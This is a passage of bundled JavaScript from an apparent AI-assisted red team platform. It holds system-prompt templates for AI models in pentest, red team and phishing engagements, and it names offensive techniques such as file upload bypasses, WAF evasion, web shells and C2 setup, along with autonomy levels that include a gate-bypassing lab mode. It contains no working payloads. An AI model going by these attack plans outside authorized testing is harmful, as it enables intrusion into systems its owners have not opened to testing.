  context += `This platform is a comprehensive red team / threat intelligence system.

`;
  const grouped = /* @__PURE__ */ new Map();
  for (const mod of filtered) {
    const existing = grouped.get(mod.category) ?? [];
    existing.push(mod);
    grouped.set(mod.category, existing);
  }
  const categoryNames = {
    platform_capabilities: "Platform Capabilities",
    engagement_operations: "Engagement Operations",
    threat_intelligence: "Threat Intelligence",
    offensive_techniques: "Offensive Techniques",
    defensive_recommendations: "Defensive Recommendations",
    compliance_frameworks: "Compliance Frameworks",
    ics_ot_security: "ICS/OT Security",
    ai_safety: "AI Safety & Governance",
    reporting: "Reporting & Documentation"
  };
  for (const [category, modules] of grouped) {
    context += `## ${categoryNames[category]}

`;
    for (const mod of modules) {
      context += `### ${mod.name}
`;
      context += `${mod.description}

`;
      if (depth !== "overview") {
        context += `Key concepts:
`;
        for (const concept of mod.concepts.slice(0, depth === "expert" ? void 0 : 4)) {
          context += `- ${concept}
`;
        }
        context += `
`;
      }
    }
  }
  return context;
}
function buildEngagementKnowledgeContext(engagementType) {
  const typeContexts = {
    vulnerability_scanning: `
# Vulnerability Scanning Engagement Context

You are assisting with a vulnerability scanning engagement. Key parameters:
- Autonomy Level: Up to Level 3 (Autonomous within ROE)
- Scope: Non-intrusive scanning only. NO exploitation.
- Tools: Nuclei, Nmap (ScanForge), DAST scanners
- Objective: Identify vulnerabilities without exploiting them
- Reporting: CVSS scoring, remediation priorities, compliance mapping
- Constraints: Rate limiting, scan windows, excluded hosts

Recommended approach:
1. Passive recon (DNS, certificates, OSINT)
2. Port scanning with service detection
3. Vulnerability scanning with severity-appropriate templates
4. False positive validation (non-intrusive verification)
5. Risk-prioritized reporting with remediation guidance
`,
    penetration_testing: `
# Penetration Testing Engagement Context

You are assisting with a penetration test. Key parameters:
- Autonomy Level: Up to Level 2 (Supervised \u2014 pause between phases)
- Scope: Controlled exploitation within defined boundaries
- Tools: Full toolkit \u2014 Nuclei, Metasploit, Burp, custom exploits
- Objective: Demonstrate real-world impact through exploitation
- Reporting: Evidence-based findings with proof of exploitation
- Constraints: ROE boundaries, excluded systems, business hours

Recommended approach:
1. Comprehensive reconnaissance (passive + active)
2. Vulnerability identification and prioritization
3. Exploitation of confirmed vulnerabilities (with evidence)
4. Post-exploitation assessment (privilege escalation, lateral movement if in scope)
5. Detailed technical report with attack narratives
`,
    red_purple_team: `
# Red/Purple Team Engagement Context

You are assisting with a red/purple team exercise. Key parameters:
- Autonomy Level: Up to Level 2 (Supervised \u2014 operator approves phases)
- Scope: Adversary emulation with stealth objectives
- Tools: Full offensive toolkit + C2 frameworks (Caldera, custom)
- Objective: Test detection and response capabilities
- Reporting: Kill chain documentation, detection gaps, MITRE ATT&CK mapping
- Constraints: Rules of engagement, no-strike list, deconfliction procedures

Recommended approach:
1. Threat modeling \u2014 select adversary to emulate (APT group, TTPs)
2. Infrastructure setup (C2, redirectors, phishing infrastructure)
3. Initial access (phishing, exploit, supply chain)
4. Establish persistence and C2 communications
5. Lateral movement toward objectives
6. Objective completion (data access, domain admin, etc.)
7. Purple team: share findings with blue team for detection improvement
`,
    cicd_integration: `
# CI/CD Integration Engagement Context

You are assisting with CI/CD security integration. Key parameters:
- Autonomy Level: Up to Level 3 (Autonomous within pipeline)
- Scope: Automated security testing in development pipeline
- Tools: SAST, DAST, SCA, container scanning, IaC scanning
- Objective: Shift-left security \u2014 find vulnerabilities before production
- Reporting: Developer-friendly findings with fix guidance
- Constraints: Pipeline time budgets, false positive tolerance

Recommended approach:
1. Pipeline analysis \u2014 identify integration points
2. SAST integration for code-level vulnerabilities
3. SCA for dependency vulnerabilities (CVE matching, KEV)
4. DAST for runtime vulnerabilities in staging
5. Container/IaC scanning for infrastructure issues
6. Automated gating \u2014 block deployments above threshold
`,
    phishing: `
# Phishing Engagement Context

You are assisting with a phishing engagement. Key parameters:
- Autonomy Level: Up to Level 1 (Assisted \u2014 operator approves all actions)
- Scope: Social engineering testing of human targets
- Tools: GoPhish, custom templates, domain infrastructure
- Objective: Assess human vulnerability to social engineering
- Reporting: Click rates, credential submission rates, awareness gaps
- Constraints: Legal requirements, HR coordination, target list approval, no real malware

Recommended approach:
1. Target research \u2014 roles, communication patterns, technology
2. Pretext development \u2014 realistic scenarios for the organization
3. Infrastructure setup \u2014 lookalike domains, landing pages, tracking
4. Campaign execution \u2014 phased delivery with monitoring
5. Results analysis \u2014 who clicked, who reported, response times
6. Awareness recommendations based on findings
`
  };
  return typeContexts[engagementType] ?? typeContexts.penetration_testing;
}
function getKnowledgeModuleCount() {
  return PLATFORM_CAPABILITIES.length + ENGAGEMENT_OPERATIONS.length + THREAT_INTELLIGENCE.length + OFFENSIVE_TECHNIQUES.length + COMPLIANCE_FRAMEWORKS.length;
}
var PLATFORM_CAPABILITIES, ENGAGEMENT_OPERATIONS, THREAT_INTELLIGENCE, OFFENSIVE_TECHNIQUES, COMPLIANCE_FRAMEWORKS;
var init_platform_knowledge_corpus = __esm({
  "server/lib/platform-knowledge-corpus.ts"() {
    "use strict";
    PLATFORM_CAPABILITIES = [
      {
        id: "cap-engagement-orchestrator",
        name: "Engagement Orchestrator",
        category: "platform_capabilities",
        description: "Core engine that drives automated engagement execution through phases: passive recon \u2192 active scanning \u2192 vulnerability assessment \u2192 exploitation \u2192 post-exploitation \u2192 reporting. Manages approval gates (yellow/orange/red risk tiers), training lab mode, and ROE scope enforcement.",
        concepts: [
          "Phase-based execution pipeline with configurable depth",
          "Risk-tiered approval gates: yellow (informational), orange (moderate), red (destructive/C2)",
          "Training lab mode bypasses all approval gates for safe practice",
          "ROE scope guard enforces authorized domains/IPs at every phase",
          "Scan profiles: quick (5min), standard (30min), deep (2hr), stealth (low-and-slow)",
          "DAST integration with configurable crawl depth, scope, and rate limiting",
          "Exhaustive exploit mode: test every opportunity, not just first success",
          "Evidence collection at every phase with S3 storage"
        ],
        integrationPoints: ["graduated-autonomy.ts", "safety-engine.ts", "post-pipeline-graduation.ts", "roe-engagement-templates.ts"],
        triggerContexts: ["engagement planning", "scan execution", "approval decisions", "phase transitions"],
        depth: "detailed"
      },
      {
        id: "cap-graduated-autonomy",
        name: "Graduated Autonomy Framework",
        category: "platform_capabilities",
        description: "4-level autonomy model governing AI decision-making during engagements. Level 0 (Advisory): AI recommends only. Level 1 (Assisted): AI executes low-risk scans. Level 2 (Supervised): AI runs full chains with phase approval. Level 3 (Autonomous): AI operates independently within ROE.",
        concepts: [
          "Autonomy levels 0-3 with increasing AI independence",
          "ROE type caps: vuln_scan\u2192L3, cicd\u2192L3, pentest\u2192L2, red_purple\u2192L2, phishing\u2192L1",
          "Graduation tier certification: Tier 1\u2192L3, Tier 2\u2192L2, Tier 3/4\u2192L1, Tier 5\u2192L0",
          "Operator can only lower autonomy, never raise above caps",
          "Anomaly detection auto-suspends to Level 0 on critical events",
          "Scope boundary approach triggers immediate suspension",
          "Red-tier actions always require dual operator approval regardless of level",
          "Autonomy state includes full audit trail of level changes"
        ],
        integrationPoints: ["engagement-orchestrator.ts", "graduation-lab-bridge.ts", "safety-engine.ts"],
        triggerContexts: ["autonomy decisions", "approval gates", "anomaly handling", "engagement configuration"],
        depth: "detailed"
      },
      {
        id: "cap-safety-engine",
        name: "Safety Engine",
        category: "platform_capabilities",
        description: "Production-safe autonomous mode with 4 safety levels: passive_only (zero target interaction), low_impact (non-destructive scanning), standard (controlled exploitation), full_exploitation (all techniques). Pre-execution risk assessment, blast radius estimation, and safety audit trail.",
        concepts: [
          "Safety profiles gate every tool execution and phase transition",
          "Tool category allowlists per safety level",
          "Predictive blast radius estimation before exploitation",
          "Dual-approval required for full_exploitation level",
          "Blocked scan flags and Nuclei tags per safety level",
          "Rate limiting per host to prevent DoS",
          "Integration with ScanPolicyEngine for SSIL controls"
        ],
        integrationPoints: ["engagement-orchestrator.ts", "graduated-autonomy.ts", "scan-policy-engine.ts"],
        triggerContexts: ["tool execution", "safety assessment", "risk evaluation"],
        depth: "detailed"
      },
      {
        id: "cap-llm-graduation",
        name: "LLM Graduation Pipeline",
        category: "platform_capabilities",
        description: "5-tier graduation system for 6 specialist AI models (recon_analyst, exploit_selector, evasion_optimizer, cognitive_core, cloud_assessor, supply_chain_analyst). Models progress from Tier 5 (Untested) to Tier 1 (Ready) based on benchmark performance, lab scenarios, and dual-sign-off promotion gates.",
        concepts: [
          "6 specialist models with distinct capabilities and scoring criteria",
          "5 graduation tiers: Ready(1), Near(2), Emerging(3), Training(4), Untested(5)",
          "Tier 1/2 promotions require dual operator sign-off (72hr expiry)",
          "Lab scenarios unlocked by tier: basic\u2192operational\u2192advanced\u2192full",
          "Training data collected from every pipeline execution",
          "Benchmark scoring across multiple dimensions per specialist",
          "Model rollback capability if performance degrades"
        ],
        integrationPoints: ["graduation-lab-bridge.ts", "training-corpus.ts", "graduated-autonomy.ts"],
        triggerContexts: ["model evaluation", "training data review", "promotion decisions"],
        depth: "expert"
      },
      {
        id: "cap-tenant-isolation",
        name: "Multi-Tenant Isolation",
        category: "platform_capabilities",
        description: "Row-level security enforcement across all tenant-scoped tables. Every protected procedure uses tenant context from middleware. Cross-tenant access is structurally impossible when using scoped query helpers.",
        concepts: [
          "TenantMiddleware resolves active tenant from membership table",
          "Tenant context injected into tRPC context (tenantId, tenantRole, tenantName, tenantPlan)",
          "Scoped query helpers enforce WHERE tenant_id = ? on all queries",
          "X-Tenant-Id header for multi-tenant users",
          "Tenant roles: owner, admin, operator, viewer",
          "Tenant plans: free, pro, enterprise (gate feature access)"
        ],
        integrationPoints: ["ai-chat-safety.ts", "all routers using protectedProcedure"],
        triggerContexts: ["data access", "authorization", "multi-tenant operations"],
        depth: "detailed"
      },
      {
        id: "cap-ai-governance",
        name: "AI Governance (NIST AI 600-1)",
        category: "ai_safety",
        description: "Comprehensive AI governance framework implementing NIST AI 600-1 risk management. Includes prompt injection detection (12+ patterns), jailbreak defense, PII scrubbing, confabulation detection, and MITRE ATLAS adversarial test suite.",
        concepts: [
          "12 prompt injection detection patterns with severity classification",
          "Homoglyph normalization for Unicode-based attacks",
          "Encoding attack detection (base64, rot13, hex)",
          "Dangerous code filtering in AI outputs",
          "PII detection and scrubbing (SSN, credit cards, emails)",
          "Confabulation detection via confidence scoring",
          "MITRE ATLAS test categories: prompt injection, model extraction, adversarial evasion, data poisoning"
        ],
        integrationPoints: ["ai-chat-safety.ts", "llm-guardrails.ts", "ai-security-validation.ts"],
        triggerContexts: ["AI interactions", "security validation", "compliance audits"],
        depth: "detailed"
      }
    ];
    ENGAGEMENT_OPERATIONS = [
      {
        id: "ops-roe-types",
        name: "ROE Engagement Types",
        category: "engagement_operations",
        description: "5 engagement types with distinct scope, guardrails, and autonomy caps. Each type has calibrated legal language, liability protections, and compliance mappings.",
        concepts: [
          "Vulnerability Scanning: Non-intrusive, automated, broad scope. Max autonomy L3. No exploitation.",
          "Penetration Testing: Controlled exploitation within defined scope. Max autonomy L2. Evidence-based.",
          "Red/Purple Team: Adversary emulation with stealth objectives. Max autonomy L2. Kill chain execution.",
          "CI/CD Integration: Automated pipeline security testing. Max autonomy L3. Shift-left focus.",
          "Phishing: Human-targeted social engineering. Max autonomy L1. Legal sensitivity, reputation risk.",
          "Each type has: scope template, guardrails, liability language, compliance mappings, autonomy cap",
          "NIST SP 800-115 alignment for all types",
          "FedRAMP and CISA BOD compliance requirements mapped to wizard fields"
        ],
        integrationPoints: ["roe-engagement-templates.ts", "roe-self-service.ts", "graduated-autonomy.ts"],
        triggerContexts: ["ROE creation", "engagement planning", "scope definition", "compliance questions"],
        depth: "detailed"
      },
      {
        id: "ops-scan-profiles",
        name: "Scan Profiles & Tooling",
        category: "engagement_operations",
        description: "Configurable scan profiles that balance thoroughness with stealth. Integrates ScanForge (Nmap), Nuclei, ZAP, Burp Suite, and custom tools.",
        concepts: [
          "Quick profile: 5min, top-1000 ports, basic vuln templates, high rate",
          "Standard profile: 30min, full TCP, comprehensive templates, moderate rate",
          "Deep profile: 2hr, TCP+UDP, all templates + custom, thorough crawling",
          "Stealth profile: low-and-slow, randomized timing, evasion techniques",
          "ScanForge: Nmap wrapper with SSIL policy enforcement",
          "Nuclei: Template-based vulnerability scanning with severity filtering",
          "ZAP/Burp: DAST scanning with authenticated crawling",
          "Tool chaining: recon \u2192 port scan \u2192 service detection \u2192 vuln scan \u2192 exploitation"
        ],
        integrationPoints: ["engagement-orchestrator.ts", "scan-policy-engine.ts", "scanforge-knowledge.ts"],
        triggerContexts: ["scan configuration", "tool selection", "profile recommendations"],
        depth: "detailed"
      },
      {
        id: "ops-evidence-collection",
        name: "Evidence Collection & Reporting",
        category: "engagement_operations",
        description: "Comprehensive evidence collection at every engagement phase. Screenshots, terminal output, HTTP request/response pairs, exploit code, tool output, PCAPs, and video recordings. All stored in S3 with integrity hashing.",
        concepts: [
          "Evidence types: screenshot, terminal_output, http_request_response, exploit_code, tool_output, notes, pcap, video, document",
          "S3 storage with presigned URLs for secure access",
          "Evidence integrity via SHA-256 hashing (KSI evidence chain)",
          "Automatic evidence capture during automated phases",
          "Manual evidence upload for operator-driven phases",
          "Report generation from collected evidence (executive, technical, compliance)",
          "CVSS scoring and risk rating for each finding"
        ],
        integrationPoints: ["ksi-evidence-chain.ts", "ac3-reports.ts", "engagement-orchestrator.ts"],
        triggerContexts: ["evidence review", "report generation", "finding documentation"],
        depth: "detailed"
      }
    ];
    THREAT_INTELLIGENCE = [
      {
        id: "ti-government-sources",
        name: "Government Threat Intelligence Sources",
        category: "threat_intelligence",
        description: "Automated ingestion from 7 government sources: OFAC SDN (sanctions), Rewards for Justice (bounties), FBI Cyber Most Wanted, DOJ indictments, NSA advisories, ACSC (Australia), CCCS (Canada). Daily pipeline at 03:30 UTC.",
        concepts: [
          "OFAC SDN: Sanctioned entities with cyber program designations",
          "Rewards for Justice: Up to $10M bounties for cyber threat actors",
          "FBI Cyber Most Wanted: Active investigations with known aliases",
          "DOJ: Indictments revealing TTPs, infrastructure, and co-conspirators",
          "NSA: Technical advisories on nation-state TTPs and mitigations",
          "ACSC: Australian threat landscape and critical infrastructure alerts",
          "CCCS: Canadian cyber threat assessments and advisories",
          "Cross-referencing across sources for comprehensive actor profiles"
        ],
        integrationPoints: ["government-intel-sources.ts", "threat-intel-daily-scheduler.ts", "threat-actor-learning-context.ts"],
        triggerContexts: ["threat actor research", "attribution", "sanctions compliance", "actor profiles"],
        depth: "detailed"
      },
      {
        id: "ti-ics-scada",
        name: "ICS/SCADA Threat Intelligence",
        category: "ics_ot_security",
        description: "Specialized ICS/OT intelligence covering CISA ICS advisories, CSAF OT parsing, Siemens ProductCERT, ICS malware families (Stuxnet, TRITON, Industroyer, PIPEDREAM), open-source tools, and 19 Dragos-named threat groups.",
        concepts: [
          "14 ICS protocols: Modbus, DNP3, S7comm, BACnet, EtherNet/IP, OPC UA, IEC 104, Profinet, CODESYS, TriStation, MQTT, M-Bus, HART, Foundation Fieldbus",
          "10 ICS vendors: Siemens, Schneider, Rockwell, ABB, Honeywell, OMRON, Emerson, GE, Yokogawa, Mitsubishi",
          "8+ ICS malware families with detailed TTPs and affected systems",
          "19 Dragos threat groups (CHERNOVITE, ELECTRUM, XENOTIME, etc.)",
          "CISA ICS-CERT advisory RSS feed integration",
          "CSAF (Common Security Advisory Framework) OT-specific parsing",
          "ICS-capable actor auto-tagging based on TTPs and targets",
          "Dragos WorldView, Claroty Team82, Nozomi Labs RSS feeds"
        ],
        integrationPoints: ["ics-scada-intel.ts", "threat-intel-daily-scheduler.ts", "engagement-orchestrator.ts"],
        triggerContexts: ["ICS engagement", "OT security assessment", "critical infrastructure", "ICS threat actors"],
        depth: "detailed"
      },
      {
        id: "ti-threat-actors",
        name: "Threat Actor Knowledge Base",
        category: "threat_intelligence",
        description: "Comprehensive threat actor catalog with 1600+ actors. Includes nation-state APTs, cybercrime groups, hacktivists, and insider threats. Each actor has aliases, TTPs, target sectors, tools, and campaign history.",
        concepts: [
          "Actor types: nation_state, cybercrime, hacktivist, insider, unknown",
          "Attribution confidence levels and multi-source correlation",
          "MITRE ATT&CK TTP mapping for each actor",
          "Tool and malware associations",
          "Target sector and geography preferences",
          "Campaign timeline and evolution tracking",
          "Cross-referencing with government sources (OFAC, FBI, DOJ)",
          "Threat level scoring: critical, high, medium, low"
        ],
        integrationPoints: ["threat-group-knowledge.ts", "threat-actor-learning-context.ts", "government-intel-sources.ts"],
        triggerContexts: ["actor research", "attribution", "threat modeling", "adversary emulation"],
        depth: "detailed"
      }
    ];
    OFFENSIVE_TECHNIQUES = [
      {
        id: "off-file-upload-bypass",
        name: "File Upload Bypass Techniques",
        category: "offensive_techniques",
        description: "80+ file upload bypass techniques covering extension manipulation, MIME confusion, magic bytes, polyglots, race conditions, path traversal, and WAF evasion. Tech-stack-specific strategies for PHP, ASP.NET, Java, Node.js, and Python.",
        concepts: [
          "Extension manipulation: case, double, null byte, special chars (newline, tab, space, dot, semicolon)",
          "MIME confusion: Content-Type spoofing, magic bytes injection, SVG/HTML for XSS",
          "Polyglot files: GIF+PHP, PHAR+JPEG, HTML+Image, GIFAR",
          "Race conditions: TOCTOU, parallel upload, chunked reassembly",
          "Path traversal: basic, encoded, IIS-specific, overlong UTF-8",
          "WAF evasion: boundary manipulation, Content-Disposition tricks, chunked encoding",
          "Post-upload: web shell execution, LFI chaining, stored XSS, SSRF to cloud metadata",
          "Tech-stack profiles with recommended bypass order and known weaknesses"
        ],
        integrationPoints: ["file-upload-bypass-knowledge.ts", "offensive-techniques-knowledge.ts", "training-corpus.ts"],
        triggerContexts: ["file upload testing", "web application pentest", "bypass strategy", "exploit development"],
        depth: "expert"
      },
      {
        id: "off-owasp-top10",
        name: "OWASP Top 10 & Web Application Security",
        category: "offensive_techniques",
        description: "Deep knowledge of OWASP Top 10 (2021) vulnerabilities with detection, exploitation, and remediation. Includes injection, broken auth, sensitive data exposure, XXE, broken access control, security misconfiguration, XSS, insecure deserialization, vulnerable components, and insufficient logging.",
        concepts: [
          "A01:2021 Broken Access Control: IDOR, privilege escalation, CORS misconfiguration",
          "A02:2021 Cryptographic Failures: weak algorithms, key management, TLS issues",
          "A03:2021 Injection: SQLi, NoSQLi, LDAP, OS command, template injection",
          "A04:2021 Insecure Design: threat modeling failures, business logic flaws",
          "A05:2021 Security Misconfiguration: default creds, unnecessary features, verbose errors",
          "A06:2021 Vulnerable Components: outdated libraries, known CVEs, supply chain",
          "A07:2021 Auth Failures: credential stuffing, session management, MFA bypass",
          "A08:2021 Software Integrity: CI/CD compromise, unsigned updates, deserialization",
          "A09:2021 Logging Failures: insufficient monitoring, alert fatigue, log injection",
          "A10:2021 SSRF: internal service access, cloud metadata, port scanning"
        ],
        integrationPoints: ["owasp-knowledge.ts", "engagement-orchestrator.ts", "nuclei templates"],
        triggerContexts: ["web app testing", "vulnerability assessment", "remediation guidance"],
        depth: "detailed"
      },
      {
        id: "off-mitre-attack",
        name: "MITRE ATT&CK Framework",
        category: "offensive_techniques",
        description: "Complete MITRE ATT&CK Enterprise matrix knowledge covering 14 tactics, 200+ techniques, and 600+ sub-techniques. Used for adversary emulation, detection engineering, and gap analysis.",
        concepts: [
          "14 tactics from Initial Access through Impact",
          "Technique-to-tool mapping for automated execution",
          "Sub-technique granularity for precise emulation",
          "ATT&CK Navigator overlay generation",
          "Procedure examples from real-world campaigns",
          "Detection opportunities at each technique",
          "Data sources required for visibility",
          "Red team vs blue team perspective on each technique"
        ],
        integrationPoints: ["threat-group-knowledge.ts", "caldera-proxy.ts", "attack-chains.ts"],
        triggerContexts: ["adversary emulation", "detection engineering", "gap analysis", "purple team"],
        depth: "detailed"
      }
    ];
    COMPLIANCE_FRAMEWORKS = [
      {
        id: "comp-nist-800-115",
        name: "NIST SP 800-115 Technical Guide",
        category: "compliance_frameworks",
        description: "Technical guide to information security testing and assessment. Defines ROE requirements, test planning, execution methodology, and reporting standards for federal systems.",
        concepts: [
          "ROE must define: scope, rules, timeline, communication, escalation, evidence handling",
          "Test types: review, target identification, target vulnerability validation, target exploitation",
          "Planning phase: objectives, scope, approach, logistics, legal considerations",
          "Execution phase: coordination, data handling, incident response, status reporting",
          "Post-testing: analysis, reporting, remediation verification",
          "Assessment methodology: passive (review), active (scanning), exploitation (validation)"
        ],
        integrationPoints: ["roe-self-service.ts", "roe-engagement-templates.ts", "ac3-reports.ts"],
        triggerContexts: ["ROE creation", "test planning", "compliance validation", "federal engagements"],
        depth: "detailed"
      },
      {
        id: "comp-fedramp",
        name: "FedRAMP Security Assessment",
        category: "compliance_frameworks",
        description: "Federal Risk and Authorization Management Program requirements for cloud security assessments. Defines control testing methodology, evidence requirements, and continuous monitoring.",
        concepts: [
          "FedRAMP baselines: Low, Moderate, High impact levels",
          "Control families: AC, AU, CA, CM, CP, IA, IR, MA, MP, PE, PL, PS, RA, SA, SC, SI",
          "Penetration testing requirements per FedRAMP guidance",
          "Continuous monitoring: monthly vuln scans, annual assessments",
          "POA&M (Plan of Action and Milestones) for findings",
          "3PAO (Third Party Assessment Organization) requirements"
        ],
        integrationPoints: ["roe-self-service.ts", "roe-engagement-templates.ts"],
        triggerContexts: ["FedRAMP assessment", "federal cloud testing", "compliance reporting"],
        depth: "detailed"
      },
      {
        id: "comp-fips-140-3",
        name: "FIPS 140-3 Cryptographic Standards",
        category: "compliance_frameworks",
        description: "Federal Information Processing Standard for cryptographic module validation. Defines approved algorithms, key lengths, and operational requirements for protecting sensitive information.",
        concepts: [
          "Approved symmetric: AES-128/192/256 (GCM, CCM, CBC)",
          "Approved asymmetric: RSA-2048+, ECDSA P-256/P-384/P-521, Ed25519",
          "Approved hash: SHA-256, SHA-384, SHA-512, SHA-3",
          "Approved KDF: HKDF, PBKDF2, SP 800-108",
          "TLS 1.2+ required, TLS 1.3 preferred",
          "Approved cipher suites for TLS",
          "Key management: generation, storage, distribution, destruction",
          "Security levels 1-4 with increasing physical security requirements"
        ],
        integrationPoints: ["fips-crypto-policy.ts", "roe-engagement-templates.ts"],
        triggerContexts: ["cryptographic decisions", "federal compliance", "secure communications"],
        depth: "expert"
      }
    ];
  }
});

// server/lib/knowledge-lazy.ts
function clearKnowledgeCache() {
  const count = _loadedModules.size;
  _loadedModules.clear();
  return count;
}
function getKnowledgeCacheSize() {
  return _loadedModules.size;
}
function getCacheStatus() {
  return {
    cachedModules: [..._loadedModules],
    cacheSize: _loadedModules.size
  };
}
function track(key) {
  _loadedModules.add(key);
}
function getNmapScanPlanContext(...args) {
  track("scanforge");
  return getScanforgeScanPlanContext(...args);
}
function getNmapVulnCorrelationContext(...args) {
  track("scanforge");
  return getScanforgeVulnCorrelationContext(...args);
}
function getNmapHuntContext(...args) {
  track("scanforge");
  return getScanforgeHuntContext();
}
function getScanforgeScanPlanContext2(...args) {
  track("scanforge");
  return getScanforgeScanPlanContext(...args);
}
function getScanforgeVulnCorrelationContext2(...args) {
  track("scanforge");
  return getScanforgeVulnCorrelationContext();
}
function getScanforgeHuntContext2(...args) {
  track("scanforge");
  return getScanforgeHuntContext();
}
function getFullScanforgeContext2(...args) {
  track("scanforge");
  return getFullScanforgeContext(...args);
}
function buildOptimalScanforgeCommand2(...args) {
  track("scanforge");
  return buildOptimalScanforgeCommand(...args);
}
function getChainsByVulnDescriptions2(...args) {
  track("chain");
  return getChainsByVulnDescriptions(...args);
}
function formatChainsForPrompt2(...args) {
  track("chain");
  return formatChainsForPrompt(...args);
}
function inferAssetContext2(...args) {
  track("ontology");
  return inferAssetContext(...args);
}
function formatOntologyForPrompt2(...args) {
  track("ontology");
  return formatOntologyForPrompt(...args);
}
function getBugBountyContext2(...args) {
  track("bb");
  return getBugBountyContext(...args);
}
function getTriageSystemPrompt2(...args) {
  track("bb");
  return getTriageSystemPrompt(...args);
}
function getTrainingExamplesForPrompt2(...args) {
  track("bb");
  return getTrainingExamplesForPrompt(...args);
}
function getTriageCorpusContext2(...args) {
  track("corpus");
  return getTriageCorpusContext(...args);
}
function buildCloudSecurityContext2(...args) {
  track("cloud");
  return buildCloudSecurityContext(...args);
}
function buildGeneralCloudContext2(...args) {
  track("cloud");
  return buildGeneralCloudContext(...args);
}
function detectCloudProviders2(...args) {
  track("cloud");
  return detectCloudProviders(...args);
}
function getOwaspScanPlanContext2(...args) {
  track("owasp");
  return getOwaspScanPlanContext(...args);
}
function getOwaspVulnCorrelationContext2(...args) {
  track("owasp");
  return getOwaspVulnCorrelationContext(...args);
}
function getOwaspAssetClassificationContext2(...args) {
  track("owasp");
  return getOwaspAssetClassificationContext(...args);
}
function getThreatGroupScanContext2(...args) {
  track("threat");
  return getThreatGroupScanContext(...args);
}
function getThreatGroupVulnContext2(...args) {
  track("threat");
  return getThreatGroupVulnContext(...args);
}
function getSectorThreatContext2(...args) {
  track("threat");
  return getSectorThreatContext(...args);
}
function getGroupsByCVE2(...args) {
  track("threat");
  return getGroupsByCVE(...args);
}
function buildOffensiveTechniquesContext2(...args) {
  track("offensive");
  return buildOffensiveTechniquesContext(...args);
}
function getFirewallEvasionContext2(...args) {
  track("offensive");
  return getFirewallEvasionContext(...args);
}
function getFileUploadBypassContext2(...args) {
  track("offensive");
  return getFileUploadBypassContext(...args);
}
function getLOTLContext2(...args) {
  track("offensive");
  return getLOTLContext(...args);
}
function getShodanReconContext2(...args) {
  track("offensive");
  return getShodanReconContext(...args);
}
function getSubdomainEnumContext2(...args) {
  track("offensive");
  return getSubdomainEnumContext(...args);
}
function buildZAPKnowledgeContext2(...args) {
  track("zap");
  return buildZAPKnowledgeContext(...args);
}
function getZAPAlertCatalogContext2(...args) {
  track("zap");
  return getZAPAlertCatalogContext(...args);
}
function getTechScanPolicyContext2(...args) {
  track("zap");
  return getTechScanPolicyContext(...args);
}
function getZAPAuthContext2(...args) {
  track("zap");
  return getZAPAuthContext(...args);
}
function getZAPReasoningPrompt2(...args) {
  track("zap");
  return getZAPReasoningPrompt(...args);
}
function getVulnPayloadContext2(...args) {
  track("zap");
  return getVulnPayloadContext(...args);
}
function buildToolRecommendationContext2(...args) {
  track("tools");
  return buildToolRecommendationContext(...args);
}
function buildAttackPlannerToolContext2(...args) {
  track("tools");
  return buildAttackPlannerToolContext(...args);
}
function buildMethodologyContext2(...args) {
  track("methodology");
  return buildMethodologyContext(...args);
}
function buildPhaseToolContext2(...args) {
  track("methodology");
  return buildPhaseToolContext(...args);
}
function buildVulnTestingContext2(...args) {
  track("methodology");
  return buildVulnTestingContext(...args);
}
function buildScanPlanningContext2(...args) {
  track("methodology");
  return buildScanPlanningContext(...args);
}
function buildMissedVulnContext2(...args) {
  track("missed");
  return buildMissedVulnContext(...args);
}
function buildMissedVulnAttackContext2(...args) {
  track("missed");
  return buildMissedVulnAttackContext(...args);
}
async function buildThreatActorLearningContext2(...args) {
  track("threat-actor");
  return buildThreatActorLearningContext(...args);
}
function buildThreatActorVulnContext2(...args) {
  track("threat-actor");
  return buildThreatActorVulnContext(...args);
}
function scoreEngagementThreatAttribution2(...args) {
  track("threat-actor");
  return scoreEngagementThreatAttribution(...args);
}
function clearThreatLearningCache2(...args) {
  track("threat-actor");
  return clearThreatLearningCache(...args);
}
function buildSourceSecretsContext2(...args) {
  track("secrets");
  return buildSourceSecretsContext(...args);
}
function buildCompactSourceSecretsContext2(...args) {
  track("secrets");
  return buildCompactSourceSecretsContext(...args);
}
function buildBurpKnowledgeContext2(...args) {
  track("burp");
  return buildBurpKnowledgeContext(...args);
}
function getBurpScanConfigContext2(...args) {
  track("burp");
  return getBurpScanConfigContext(...args);
}
function getBurpAttackProfileContext2(...args) {
  track("burp");
  return getBurpAttackProfileContext(...args);
}
function getBurpCollaboratorContext2(...args) {
  track("burp");
  return getBurpCollaboratorContext(...args);
}
function getCrossToolCorrelationContext2(...args) {
  track("burp");
  return getCrossToolCorrelationContext(...args);
}
function getBurpReasoningPrompt2(...args) {
  track("burp");
  return getBurpReasoningPrompt(...args);
}
async function lazyFetchKevCatalog(...args) {
  track("kev");
  return fetchKevCatalog(...args);
}
function lazyMatchCvesAgainstKev(...args) {
  track("kev");
  return matchCvesAgainstKev(...args);
}
function lazyCalculateKevRiskBoost(...args) {
  track("kev");
  return calculateKevRiskBoost(...args);
}
function buildFileUploadTrainingContext2(...args) {
  track("file-upload");
  return buildFileUploadTrainingContext(...args);
}
function getBypassStrategy2(...args) {
  track("file-upload");
  return getBypassStrategy(...args);
}
function getTechniquesForStack2(...args) {
  track("file-upload");
  return getTechniquesForStack(...args);
}
function getTechniquesByCategory2(...args) {
  track("file-upload");
  return getTechniquesByCategory(...args);
}
function buildPlatformKnowledgeContext2(...args) {
  track("platform-corpus");
  return buildPlatformKnowledgeContext(...args);
}
function buildEngagementKnowledgeContext2(...args) {
  track("platform-corpus");
  return buildEngagementKnowledgeContext(...args);
}
function getKnowledgeModuleCount2(...args) {
  track("platform-corpus");
  return getKnowledgeModuleCount(...args);
}
function evaluateAutonomyLevel2(...args) {
  track("autonomy");
  return evaluateAutonomyLevel(...args);
}
function canExecuteAction2(...args) {
  track("autonomy");
  return canExecuteAction(...args);
}
function getAutonomyDescription2(...args) {
  track("autonomy");
  return getAutonomyDescription(...args);
}
function createSafeChatContext2(...args) {
  track("ai-safety");
  return createSafeChatContext(...args);
}
function sanitizeAIOutput2(...args) {
  track("ai-safety");
  return sanitizeAIOutput(...args);
}
function detectPromptInjection2(...args) {
  track("ai-safety");
  return detectPromptInjection(...args);
}
var _loadedModules;
var init_knowledge_lazy = __esm({
  "server/lib/knowledge-lazy.ts"() {
    init_scanforge_knowledge();
    init_attack_chain_retriever();
    init_asset_ontology();
    init_bugbounty_knowledge();
    init_training_corpus();
    init_cloud_security_knowledge();
    init_owasp_knowledge();
    init_threat_group_knowledge();
    init_offensive_techniques_knowledge();
    init_zap_pentesting_knowledge();
